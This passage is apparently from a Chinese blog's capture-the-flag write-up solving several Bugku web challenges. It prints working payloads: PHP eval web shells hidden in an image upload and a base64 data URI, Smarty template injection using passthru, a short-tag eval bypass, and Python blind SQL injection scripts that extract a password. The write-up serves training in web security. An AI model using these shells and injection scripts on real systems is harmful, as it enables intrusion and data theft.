class=\"line\">    \t&#125;</span><br><span class=\"line\">    \tmove_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;tmp_name&quot;</span>],<span class=\"string\">&quot;upload/&quot;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>]);</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Upload Success&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable\">$filepath</span> = <span class=\"string\">&quot;upload/&quot;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;name&quot;</span>];</span><br><span class=\"line\">      \t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;Stored in: &quot;</span> .<span class=\"string\">&quot;&lt;a href=&#x27;&quot;</span> . <span class=\"variable\">$filepath</span> . <span class=\"string\">&quot;&#x27; target=&#x27;_blank&#x27;&gt;&quot;</span> . <span class=\"variable\">$filepath</span> . <span class=\"string\">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#125;php</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>][<span class=\"string\">&quot;size&quot;</span>] &gt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;You was catched! :) &lt;br /&gt;&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>通过分析源代码可知会先判断$type是否是”multipart/form-data”，再判断[“file”][“type”],“type”是否是’image’，最后判断文件的后缀名名是否是数组里的内容。（就算type的内容是multipart/form-data，也会100%被拦截）</p>\n<h4 id=\"字符？正则？\"><a href=\"#字符？正则？\" class=\"headerlink\" title=\"字符？正则？\"></a>字符？正则？</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">highlight_file(<span class=\"string\">&#x27;2.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$key</span>=<span class=\"string\">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$IM</span>= preg_match(<span class=\"string\">&quot;/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;id&quot;</span>]), <span class=\"variable\">$match</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"variable\">$IM</span> )&#123; </span><br><span class=\"line\"> <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;key is: &#x27;</span>.<span class=\"variable\">$key</span>);  <span class=\"comment\">//匹配就输出flag</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>构造<a href=\"http://114.67.175.224:16833/?id=keyaaaakey____akey:/_/_keya:\">114.67.175.224:16833/?id=keyaaaakey____akey:/_/_keya:</a></p>\n<p>.                                  匹配除 “\\n” 之外的任何单个字符</p>\n<ul>\n<li><pre><code>                            匹配它前面的表达式0次或多次，等价于&#123;0,&#125;\n</code></pre>\n</li>\n</ul>\n<p>{4,7}                           最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符</p>\n<p>/                                匹配 / ，这里的 \\ 是为了转义</p>\n<p>[a-z]                           匹配所有小写字母</p>\n<p>[:punct:]                     匹配任何标点符号</p>\n<p>/i                                表示不分大小写</p>\n<h4 id=\"需要管理员\"><a href=\"#需要管理员\" class=\"headerlink\" title=\"需要管理员\"></a>需要管理员</h4><h5 id=\"御剑爆破，查出robots-txt里面提示resusl-php-提示\"><a href=\"#御剑爆破，查出robots-txt里面提示resusl-php-提示\" class=\"headerlink\" title=\"御剑爆破，查出robots.txt里面提示resusl.php,提示\"></a>御剑爆破，查出robots.txt里面提示resusl.php,提示</h5><p>By bugkuctf.</p>\n<p>if ($_GET[x]==$password) 此处省略1w字</p>\n<h5 id=\"访问resusl-php-x-admin即可得到flag\"><a href=\"#访问resusl-php-x-admin即可得到flag\" class=\"headerlink\" title=\"访问resusl.php/?x=admin即可得到flag\"></a>访问resusl.php/?x=admin即可得到flag</h5><h4 id=\"文件包含2\"><a href=\"#文件包含2\" class=\"headerlink\" title=\"文件包含2\"></a>文件包含2</h4><h5 id=\"尝试了asp没成功，看别人写的wp，知道了新的一句话木马\"><a href=\"#尝试了asp没成功，看别人写的wp，知道了新的一句话木马\" class=\"headerlink\" title=\"尝试了asp没成功，看别人写的wp，知道了新的一句话木马\"></a>尝试了asp没成功，看别人写的wp，知道了新的一句话木马</h5><p>找到一个<code>&lt;script language=php&gt;eval($_POST[shell])&lt;/script&gt;</code> 是可行的</p>\n<blockquote>\n<p>这个一句话shell是一个script标签，利用language属性可以指定脚本语言的特性，调用php解释器，运行php代码</p>\n</blockquote>\n<h5 id=\"先是找到upload-php，在上传jpg文件，再文件包含。使用图片加php文件即copy-C-Users-Desktop-1-jpg-b-C-Users-Desktop-web-php-a-hack-jpg-的方式上传合并的图片，再包含。注意的是被执行的代码是不会在包含的页面显示出来，这样就可以判断是否会执行。\"><a href=\"#先是找到upload-php，在上传jpg文件，再文件包含。使用图片加php文件即copy-C-Users-Desktop-1-jpg-b-C-Users-Desktop-web-php-a-hack-jpg-的方式上传合并的图片，再包含。注意的是被执行的代码是不会在包含的页面显示出来，这样就可以判断是否会执行。\" class=\"headerlink\" title=\"先是找到upload.php，在上传jpg文件，再文件包含。使用图片加php文件即copy C:\\Users\\Desktop\\1.jpg/b+C:\\Users\\Desktop\\web.php/a hack.jpg 的方式上传合并的图片，再包含。注意的是被执行的代码是不会在包含的页面显示出来，这样就可以判断是否会执行。\"></a>先是找到upload.php，在上传jpg文件，再文件包含。使用图片加php文件即copy C:\\Users\\Desktop\\1.jpg/b+C:\\Users\\Desktop\\web.php/a hack.jpg 的方式上传合并的图片，再包含。注意的是被执行的代码是不会在包含的页面显示出来，这样就可以判断是否会执行。</h5><h4 id=\"聪明的php\"><a href=\"#聪明的php\" class=\"headerlink\" title=\"聪明的php\"></a>聪明的php</h4><h5 id=\"随便输入一个参数，可以得到源代码，发现是Smarty模板，输入-7-7-得到49，验证成功。\"><a href=\"#随便输入一个参数，可以得到源代码，发现是Smarty模板，输入-7-7-得到49，验证成功。\" class=\"headerlink\" title=\"随便输入一个参数，可以得到源代码，发现是Smarty模板，输入{7*7},得到49，验证成功。\"></a>随便输入一个参数，可以得到源代码，发现是Smarty模板，输入{7*7},得到49，验证成功。</h5><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">pass a parameter <span class=\"keyword\">and</span> maybe the flag file<span class=\"string\">&#x27;s filename is random :&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"> &lt;?php include(&#x27;</span>./libs/Smarty.<span class=\"keyword\">class</span>.php<span class=\"string\">&#x27;);</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">echo &quot;pass a parameter and maybe the flag file&#x27;</span>s filename is random :&gt;<span class=\"string\">&quot;;</span></span><br><span class=\"line\"><span class=\"string\"><span class=\"subst\">$smarty</span> = new Smarty();</span></span><br><span class=\"line\"><span class=\"string\">if(<span class=\"subst\">$_GET</span>)&#123;  </span></span><br><span class=\"line\"><span class=\"string\">highlight_file(&#x27;index.php&#x27;);  </span></span><br><span class=\"line\"><span class=\"string\">foreach (<span class=\"subst\">$_GET</span> AS <span class=\"subst\">$key</span> =&gt; <span class=\"subst\">$value</span>)  </span></span><br><span class=\"line\"><span class=\"string\">&#123;    </span></span><br><span class=\"line\"><span class=\"string\">print <span class=\"subst\">$key</span>.&quot;</span>\\n<span class=\"string\">&quot;;    </span></span><br><span class=\"line\"><span class=\"string\">if(preg_match(&quot;</span>/flag|\\/flag/i<span class=\"string\">&quot;, <span class=\"subst\">$value</span>))&#123;         //过滤flag和/flag     </span></span><br><span class=\"line\"><span class=\"string\"><span class=\"subst\">$smarty</span>-&gt;display(&#x27;./template.html&#x27;);    &#125;elseif(preg_match(&quot;</span>/system|readfile|gz|exec|<span class=\"keyword\">eval</span>|cat|assert|file|fgets/i<span class=\"string\">&quot;, <span class=\"subst\">$value</span>))&#123;      //过滤出现的所有函数</span></span><br><span class=\"line\"><span class=\"string\"><span class=\"subst\">$smarty</span>-&gt;display(&#x27;./template.html&#x27;);    //里面是假的flag            </span></span><br><span class=\"line\"><span class=\"string\">&#125;else&#123;      </span></span><br><span class=\"line\"><span class=\"string\"><span class=\"subst\">$smarty</span>-&gt;display(&quot;</span><span class=\"keyword\">eval</span>:<span class=\"string\">&quot;.<span class=\"subst\">$value</span>);    </span></span><br><span class=\"line\"><span class=\"string\">&#125;      </span></span><br><span class=\"line\"><span class=\"string\">&#125;&#125;?&gt; </span></span><br></pre></td></tr></table></figure>\n\n<p><strong>php命令执行函数有</strong></p>\n<p><strong><a href=\"https://link.zhihu.com/?target=https://www.php.net/exec\">https://www.php.net/exec</a></strong></p>\n<blockquote>\n<p><strong>exec — 执行一个外部程序</strong><br><strong>passthru — 执行外部程序并且显示原始输出</strong><br><strong>proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码</strong><br><strong>proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。</strong><br><strong>popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</strong><br><strong>proc_terminate — 杀除由 proc_open 打开的进程</strong><br><strong>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</strong><br><strong>system — 执行外部程序，并且显示输出</strong><br><strong>scandir 列出指定路径中的文件和目录</strong><br><strong>eval — 把字符串作为PHP代码执行</strong><br><strong>assert –函数直接将传入的参数当成PHP代码执行</strong></p>\n</blockquote>\n<p><strong>linux查看文件的命令</strong></p>\n<blockquote>\n<p><strong>cat tac more less head tail nl static-sh paste od bzmore bzless</strong></p>\n</blockquote>\n<p><strong>php文件读取函数</strong></p>\n<blockquote>\n<p><strong>print<em>r() fread() fgets() var</em>dump()</strong></p>\n</blockquote>\n<p>所以构造/?a={passthru(“ls%20/“)} a _5253 bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</p>\n<p>?a={passthru(“more%20/_5253”)}</p>\n<p>即可得到flag</p>\n<h4 id=\"点login咋没反应\"><a href=\"#点login咋没反应\" class=\"headerlink\" title=\"点login咋没反应\"></a>点login咋没反应</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$KEY=&#x27;ctf.bugku.com&#x27;;</span><br><span class=\"line\">include_once(&quot;flag.php&quot;);</span><br><span class=\"line\">$cookie = $_COOKIE[&#x27;BUGKU&#x27;];</span><br><span class=\"line\">if(isset($_GET[&#x27;3626&#x27;]))&#123;</span><br><span class=\"line\">    show_source(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">elseif (unserialize($cookie) === &quot;$KEY&quot;)</span><br><span class=\"line\">&#123;   </span><br><span class=\"line\">    echo &quot;$flag&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else &#123;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class=\"line\">&lt;title&gt;Login&lt;/title&gt;</span><br><span class=\"line\">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;br&gt;</span><br><span class=\"line\">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;</span><br><span class=\"line\">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;</span><br><span class=\"line\">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt;</span><br><span class=\"line\">  &lt;/form&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"请求头增加：cookie-BUGKU-s-13-”ctf-bugku-com”-即可得到flag\"><a href=\"#请求头增加：cookie-BUGKU-s-13-”ctf-bugku-com”-即可得到flag\" class=\"headerlink\" title=\"请求头增加：cookie: BUGKU=s:13:”ctf.bugku.com”;即可得到flag\"></a>请求头增加：cookie: BUGKU=s:13:”ctf.bugku.com”;即可得到flag</h5><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$x</span>=<span class=\"string\">&quot;ctf.bugku.com&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$content</span>=serialize(<span class=\"variable\">$x</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> (<span class=\"variable\">$content</span>); <span class=\"comment\">//序列化</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"sql注入\"><a href=\"#sql注入\" class=\"headerlink\" title=\"sql注入\"></a>sql注入</h4><p>1.需要用bs测试哪些是违规字符</p>\n<p>a’or(1&lt;&gt;1)#username does not exist!   取值为假<br>a‘or(1&lt;&gt;2)#password error!                  取值为真</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">                        <span class=\"comment\">#判断数据库的长度为8</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;http://114.67.175.224:18070/index.php&#x27;</span></span><br><span class=\"line\">r=requests.session()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">20</span>):</span><br><span class=\"line\">    data=&#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;username&#x27;</span>:<span class=\"string\">&#x27;a\\&#x27;or(length(database())&gt;&#x27;</span>+<span class=\"built_in\">str</span>(i)+<span class=\"string\">&#x27;)#&#x27;</span>,<span class=\"string\">&#x27;password&#x27;</span>:<span class=\"string\">&#x27;123&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    res1=r.post(url,data=data)</span><br><span class=\"line\"></span><br><span class=\"line\">    m=res1.text.split(<span class=\"string\">&#x27;&lt;p align=\\&#x27;center\\&#x27;&gt;&#x27;</span>)[<span class=\"number\">1</span>].split(<span class=\"string\">&quot;&lt;/p&gt;&lt;/font&gt;&quot;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(m)</span><br><span class=\"line\"><span class=\"comment\">#username does not exist!  0</span></span><br><span class=\"line\"><span class=\"comment\">#password error!  1</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span>  requests</span><br><span class=\"line\">string_all=<span class=\"string\">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>  //密码里一般是md5加密后的，都是小写</span><br><span class=\"line\">url=<span class=\"string\">&quot;http://114.67.175.224:18070/index.php&quot;</span></span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">fla=<span class=\"number\">0</span></span><br><span class=\"line\">r=requests.session()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> string_all:</span><br><span class=\"line\">        j=j+flag </span><br><span class=\"line\">        payload=<span class=\"string\">&quot;a&#x27;or(!(substr((password)from(&#123;0&#125;))&lt;&gt;&#x27;&#123;1&#125;&#x27;))#&quot;</span>.<span class=\"built_in\">format</span>((-i), j)  //从-i到以后</span><br><span class=\"line\">        data=&#123;</span><br><span class=\"line\">            <span class=\"string\">&quot;username&quot;</span>:payload,</span><br><span class=\"line\">            <span class=\"string\">&quot;password&quot;</span>:<span class=\"string\">&quot;admin&quot;</span>,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        response=r.post(url,data=data)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;password error&quot;</span> <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">            flag=j</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag+<span class=\"string\">&quot;this cycle is finished with right result&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> j[<span class=\"number\">0</span>]==<span class=\"string\">&#x27;z&#x27;</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag + <span class=\"string\">&quot;this cycle is finished with the end&quot;</span>)</span><br><span class=\"line\">            fla=<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> fla==<span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;password is&quot;</span>+flag)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#username does not exist!  0</span></span><br><span class=\"line\"><span class=\"comment\">#password error!  1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#4DCC88F8F1BC05E7C2AD1A60288481A2</span></span><br><span class=\"line\">md5解密是bugkuctf，采用的方式是从后往前爆破密码中的内容</span><br></pre></td></tr></table></figure>\n\n<p>?zero=ZmxhZw==&amp;first=girl|.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$zero</span>=<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;zero&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$first</span>=<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;first&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$second</span>=<span class=\"variable\">$zero</span>.<span class=\"variable\">$first</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match_all(<span class=\"string\">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,<span class=\"variable\">$second</span>))&#123;  <span class=\"comment\">//匹配里面的任何一个，不分大小写</span></span><br><span class=\"line\">  <span class=\"variable\">$key</span>=<span class=\"variable\">$second</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&quot;/\\.\\.|flag/&quot;</span>,<span class=\"variable\">$key</span>))&#123; <span class=\"comment\">//匹配..或flag</span></span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Noooood hacker!&quot;</span>);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$third</span>=<span class=\"variable\">$first</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&quot;/\\\\|\\056\\160\\150\\x70/i&quot;</span>,<span class=\"variable\">$third</span>))&#123; <span class=\"comment\">//形如\\xnn为16进制(Hex)，\\nnn为8进制(Oct)在计算机导论中有讲过 ,php中将自动识别,其代表着.php</span></span><br><span class=\"line\"><span class=\"comment\">//这里有个优先级的问题，当匹配字符串中有字符串转义时，先进行字符串转义，然后进行正则匹配的相关转义。</span></span><br><span class=\"line\">      <span class=\"variable\">$end</span>=substr(<span class=\"variable\">$third</span>,<span class=\"number\">5</span>);</span><br><span class=\"line\">      highlight_file(base64_decode(<span class=\"variable\">$zero</span>).<span class=\"variable\">$end</span>);<span class=\"comment\">//maybe flag in flag.php</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"“-056-160-150-x70-i-”-后面的为-php，自动转换。需要注意的是-有两次转义，第一次为-第二次为-。所以匹配的是-php\"><a href=\"#“-056-160-150-x70-i-”-后面的为-php，自动转换。需要注意的是-有两次转义，第一次为-第二次为-。所以匹配的是-php\" class=\"headerlink\" title=\"“/\\|\\056\\160\\150\\x70/i ”   后面的为.php，自动转换。需要注意的是\\ \\ | ,有两次转义，第一次为\\ |,第二次为 |。所以匹配的是|.php.\"></a>“/\\|\\056\\160\\150\\x70/i ”   后面的为.php，自动转换。需要注意的是\\ \\ | ,有两次转义，第一次为\\ |,第二次为 |。所以匹配的是|.php.</h5><h6 id=\"综上为-zero-ZmxhZw-amp-first-girl-php-zero代表着是flag。\"><a href=\"#综上为-zero-ZmxhZw-amp-first-girl-php-zero代表着是flag。\" class=\"headerlink\" title=\"综上为?zero=ZmxhZw==&amp;first=girl|.php    zero代表着是flag。\"></a>综上为?zero=ZmxhZw==&amp;first=girl|.php    zero代表着是flag。</h6><h5 id=\"正则：-‘-’匹配’-’-‘-’匹配’-’-而如果是-匹配’-’-‘-’经过测试拦截了“-”-这两个都要拦截，不只是“-”\"><a href=\"#正则：-‘-’匹配’-’-‘-’匹配’-’-而如果是-匹配’-’-‘-’经过测试拦截了“-”-这两个都要拦截，不只是“-”\" class=\"headerlink\" title=\"正则： ‘\\ |’匹配’|’ ‘\\ \\ |’匹配’|’ 而如果是\\ \\ \\ |匹配’\\ |’ ‘\\ \\ \\ \\ |’经过测试拦截了“,\\ \\” 这两个都要拦截，不只是“\\ \\”\"></a>正则： ‘\\ |’匹配’|’ ‘\\ \\ |’匹配’|’ 而如果是\\ \\ \\ |匹配’\\ |’ ‘\\ \\ \\ \\ |’经过测试拦截了“,\\ \\” 这两个都要拦截，不只是“\\ \\”</h5><h4 id=\"闪电十六鞭\"><a href=\"#闪电十六鞭\" class=\"headerlink\" title=\"闪电十六鞭\"></a>闪电十六鞭</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">p<span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">require</span> <span class=\"keyword\">__DIR__</span>.<span class=\"string\">&#x27;/flag.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$exam</span> = <span class=\"string\">&#x27;return\\&#x27;&#x27;</span>.sha1(time()).<span class=\"string\">&#x27;\\&#x27;;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;flag&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;a href=&quot;./?flag=&#x27;</span>.<span class=\"variable\">$exam</span>.<span class=\"string\">&#x27;&quot;&gt;Click here&lt;/a&gt;&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (strlen(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;flag&#x27;</span>]) != strlen(<span class=\"variable\">$exam</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;长度不允许&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">&#x27;/`|&quot;|\\.|\\\\\\\\|\\(|\\)|\\[|\\]|_|flag|echo|print|require|include|die|exit/is&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;flag&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;关键字不允许&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">eval</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;flag&#x27;</span>]) === sha1(<span class=\"variable\">$flag</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;马老师发生甚么事了&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n\n<p>s 模式中的圆点元字符（.）匹配所有的字符，包括换行符</p>\n<p>\\ \\ \\ \\ |经过测试拦截了“,\\ \\” 这两个都要拦截，不只是“\\ \\”</p>\n<p> 下面存在eval()函数，我们可以通过构造php代码来绕过</p>\n<h5 id=\"和是短标签而是长标签，\"><a href=\"#和是短标签而是长标签，\" class=\"headerlink\" title=\"和是短标签而是长标签，\"></a><? ?>和<?= ?>是短标签而<?php ?>是长标签，</h5><h5 id=\"其中\"><a href=\"#其中\" class=\"headerlink\" title=\"其中\"></a>其中<?= 是代替 <? echo的，<? ?> 代替的是<?php ?></h5><p>按照这样来构造<?=$flag;?>，flag被过滤了,用$a构造一个flag字符串,然后echo$$a,[]也被过滤了<br>然后构造得</p>\n<p>/?flag=$a=’fla9’;$a{3}=’g’;?&gt;<?=$$a;?>111111111111111111</p>\n<p>##用’’是因为””被过滤了<br>从flag=后面开始数，长度刚好要等于49,111~就是为了凑<br>flag被过滤了，所以fla9，再把9用g替换<br>弄完一个记得分号;<br>eval($a=’fla9’;$a{3}=’g’;?&gt;<?=$$a;?>111111111111111111)</p>\n<p>或者</p>\n<p>首先要介绍的是php短标签风格：</p>\n<p><strong>①开启短标签风格后，能够正常解析 phpinfo(); ?&gt;这样的代码</strong></p>\n<p><strong>②可以使用<?=$a?>进行输出。举个例子：&lt;php? echo ‘hello’; ?&gt; 等价于 <?='hello';?></strong></p>\n<p>其次，flag被过滤了，可用先赋其他值，再修改的方法绕过</p>\n<p>由于[]也被过滤掉了，我们需要用{}来代替其作用。最后，还要保证的一点就是长度，若长度不够，可以在中间插入无关的字符</p>\n<p>payload = <strong>?flag=$a=’flxg’;$a{2}=’a’;11111111111111111;?&gt;<?=$$a;?>，因为短标签格式是可以识别phpinfo() ?&gt;等类似只有?&gt;形式的代码，所以payload前半段不需要加上&lt;?</strong></p>\n<h4 id=\"xxx二手交易市场\"><a href=\"#xxx二手交易市场\" class=\"headerlink\" title=\"xxx二手交易市场\"></a>xxx二手交易市场</h4><h5 id=\"1-随便注册一个账号，随便翻一下页面，发现有一个头像上传，bs抓包。\"><a href=\"#1-随便注册一个账号，随便翻一下页面，发现有一个头像上传，bs抓包。\" class=\"headerlink\" title=\"1.随便注册一个账号，随便翻一下页面，发现有一个头像上传，bs抓包。\"></a>1.随便注册一个账号，随便翻一下页面，发现有一个头像上传，bs抓包。</h5><p>发现有照片数据，将其改为php文件，并修改数据即下面这样。</p>\n<p>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzeWMnXSk7Pz4=</p>\n<p>2.蚁剑连接，密码syc，连接成功，最终在html目录内发现flag。</p>\n<h4 id=\"安慰奖\"><a href=\"#安慰奖\" class=\"headerlink\" title=\"安慰奖\"></a>安慰奖</h4><p>c查看源代码，发现backup，访问index.php.bak获得源代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">header(<span class=\"string\">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\">error_reporting(<span 